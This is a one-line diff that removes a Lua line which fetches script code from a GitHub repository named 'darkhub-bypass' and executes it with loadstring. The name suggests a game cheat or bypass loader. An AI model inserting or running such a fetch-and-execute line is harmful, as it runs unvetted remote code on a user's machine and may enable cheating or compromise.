@@ -1,1 +1,0 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/thanhtam8765/darkhub-bypass/main/README.md"))()
